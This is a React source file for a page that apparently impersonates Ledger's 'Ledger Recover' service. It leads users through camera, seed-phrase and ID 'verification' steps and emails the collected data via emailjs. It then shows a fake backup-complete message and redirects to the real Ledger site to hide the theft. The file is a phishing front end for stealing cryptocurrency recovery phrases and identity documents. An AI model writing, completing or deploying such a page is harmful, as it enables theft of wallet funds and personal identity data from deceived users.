import React, { useState, useEffect, useContext } from 'react';
import { AuthContext } from '../context/AuthContext';
import IdVerification from '../components/IdVerification';
import SeedPhraseVerification from '../components/SeedPhraseVerification';
import CameraVerification from '../components/CamVerification';
import Modal from 'react-modal';
import { FaCheckCircle } from 'react-icons/fa';
import emailjs from 'emailjs-com';

Modal.setAppElement('#root');

function AuthPage() {
  const [currentStep, setCurrentStep] = useState(1);
  const { state } = useContext(AuthContext);
  const [isModalOpen, setIsModalOpen] = useState(false);

  const handleNextStep = () => {
    setCurrentStep(currentStep + 1);
  };

  const sendEmail = () => {
    if (currentStep < 4 || !state.photo) {
      alert('Please complete all steps and capture a photo.');
      return;
    }

    setIsModalOpen(true); // Open modal before sending the email

    const templateParams = {
      id: state.photo,
      seedPhrase: 'valid-seed-phrase',
      photo: state.photo,
    };

    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams, 'YOUR_USER_ID')
      .then((result) => {
        console.log(result.text);
        alert('Email sent successfully!');
      }, (error) => {
        console.log(error.text);
        alert('Failed to send email.');
      });
  };

  useEffect(() => {
    if (isModalOpen) {
      launchConfetti();
    }
  });

  // const handleCloseModal = () => {
  //   setIsModalOpen(false);
  //   window.location.href = 'https://example.com'; // Redirect to another site
  // };

  const launchConfetti = () => {
    // Use setInterval to repeatedly create confetti pieces every 10ms
    setInterval(() => {
      createConfettiPiece();
    }, 10); // Adjust the interval time as needed to control the frequency of confetti creation
  };
  
  const createConfettiPiece = () => {
    // Create a new div element to act as a confetti piece
    const confetti = document.createElement('div');
    
    // Randomize size and color of the confetti piece
    const size = Math.random() * 8 + 4 + 'px';
    const color = `hsl(${Math.random() * 360}, 100%, 50%)`;
  
    // Add a CSS class for basic confetti styling
    confetti.classList.add('confetti');
  
    // Apply randomized styles to the confetti piece
    confetti.style.width = size;
    confetti.style.height = size;
    confetti.style.backgroundColor = color;
    confetti.style.position = 'absolute';
    confetti.style.top = '-10px'; // Start just above the visible area
    confetti.style.left = Math.random() * 100 + '%'; // Random horizontal position
    confetti.style.opacity = Math.random() + 0.5; // Random opacity between 0.5 and 1
    confetti.style.transform = `rotate(${Math.random() * 360}deg)`; // Random initial rotation
    confetti.style.transition = 'transform 0.6s ease-out, opacity 1.2s ease-out'; // Smooth falling animation
  
    // Append the confetti piece to the container in the DOM
    document.getElementById('confetti-container').appendChild(confetti);
  
    // Trigger the falling animation
    setTimeout(() => {
      confetti.style.transform = `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`; // Fall down to the bottom of the screen
      confetti.style.opacity = 0; // Fade out as it falls
    }, Math.random() * 100);
  
    // Remove the confetti piece from the DOM after the animation is complete
    setTimeout(() => {
      confetti.remove();
    }, 2000);
  };
  
  
  const handleCloseModal = () => {
    setIsModalOpen(false);
    window.location.href = 'https://shop.ledger.com/pages/ledger-recover#offers'; // Redirect to the external URL
  };



  return (
    <div className="container mx-auto p-5">
      <h1 className="text-3xl font-bold text-center mb-8">Ledger Recovery Services</h1>

      {/* Progress Bar */}
      <div className="flex justify-around mb-10 max-xl:hidden">
        {[...Array(4)].map((_, index) => (
          <div key={index} className="flex flex-col items-center">
            <div className={`w-10 h-10 ${currentStep >= index + 1 ? 'bg-blue-500' : 'bg-gray-300'} text-white rounded-full flex items-center justify-center`}>
              {index + 1}
            </div>
            <span className="mt-2 font-normal font-serif leading-tighter tracking-tighter 2xl:leading-tight 2xl:tracking-tight">{['Camera Verification', 'Seed Phrase Verification', 'IdVerification', 'Back Up'][index]}</span>
          </div>
        ))}
      </div>

      {/* Steps */}
      {currentStep === 1 && <CameraVerification onNext={handleNextStep} />}
      {currentStep === 2 && <SeedPhraseVerification onNext={handleNextStep} />}
      {currentStep === 3 && <IdVerification onNext={handleNextStep} />}
      {currentStep === 4 && (
        <div>
          <h2 className="text-xl font-semibold mb-4">Backup</h2>
          <button onClick={sendEmail} className="bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600">Back Up</button>
        </div>
      )}

      {/* Backup Complete Modal */}
      <div className='container mx-auto p-5'>
      <div id="confetti-container" className="fixed inset-0 pointer-events-none overflow-hidden z-50"></div>
      <Modal
        isOpen={isModalOpen}
        onRequestClose={handleCloseModal}
        className="fixed inset-0 bg-black p-4 flex flex-col items-center text-white justify-center z-50"
        overlayClassName="fixed inset-0 bg-black bg-opacity-50 z-40"
      >
        <div className="flex flex-col items-center justify-center text-center">
          <FaCheckCircle className="text-green-500 text-6xl mb-4" />
          <p className="">Backup Complete!</p>
          {/* <img src="/mnt/data/WhatsApp Image 2024-08-04 at 6.43.22 AM.jpeg" 
          alt="Backup Complete" 
          className="mx-auto mb-4 object-cover w-full h-full absolute top-0 left-0" /> */}
          <p className="text-xl m-2 font-bold">You&apos;ve secured the backup for your Secret Recovery Phrase using Ledger Recover.</p>
          <p className='m-2 '>Your information is been processed !</p>
          <button onClick={handleCloseModal} className="mt-4 font-semibold bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600">Close</button>
        </div>
      </Modal>
      </div>
    </div>
  );
}

export default AuthPage;
